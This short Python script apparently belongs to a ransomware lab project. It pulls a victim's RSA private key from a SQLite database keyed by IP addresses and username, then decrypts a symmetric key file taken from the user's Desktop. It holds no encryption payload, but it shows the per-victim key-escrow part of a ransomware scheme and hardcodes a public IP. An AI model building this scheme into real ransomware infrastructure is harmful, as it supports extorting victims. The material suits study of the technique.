import sqlite3
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
import os # makes diffrent kinds of OS operations


def write_private_key(publicIP, privateIP, user_name):
    with sqlite3.connect('users.db') as con:
        cur = con.cursor()
        cur.execute(f"SELECT PRIVATE_KEY FROM USERS WHERE PUBLIC_IP=? AND PRIVATE_IP=? AND USER=?", (publicIP, privateIP, user_name,))
        rows = cur.fetchone()
        private_key = None
        for value in rows:
            private_key = value
        with open('private.pem', 'wb') as f: #w not good
            f.write(private_key)

def decrypt_sym_key():
    #key should be on desk
    root_directory = os.path.expanduser('~')
    with open(f'{root_directory}\\Desktop\\Encrypted_Key.txt', 'rb') as readFile:
        enc_sym_key = readFile.read()
    private_key = RSA.import_key(open('private.pem').read())  
    private_cryptor = PKCS1_OAEP.new(private_key)
    dec_fernet_key = private_cryptor.decrypt(enc_sym_key)
    with open('DECRYPTED_SYM_KEY.txt', 'wb') as f:
        f.write(dec_fernet_key)

if __name__ == '__main__':
    # insert values for sym key decription
    publicIP = '37.142.197.213'
    privateIP = '10.10.10.2'
    user_name = 'IEUser'
    write_private_key(publicIP, privateIP, user_name)
    decrypt_sym_key()